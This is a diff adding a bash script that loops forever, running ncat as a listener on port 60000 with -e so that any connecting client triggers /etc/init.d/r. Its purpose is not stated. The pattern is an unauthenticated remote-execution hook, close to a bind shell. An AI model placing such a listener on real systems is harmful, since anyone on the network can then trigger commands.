@@ -1,0 +1,5 @@
+#!/bin/bash
+while true; do
+    ncat -l 60000 -e /etc/init.d/r
+    sleep 1
+done
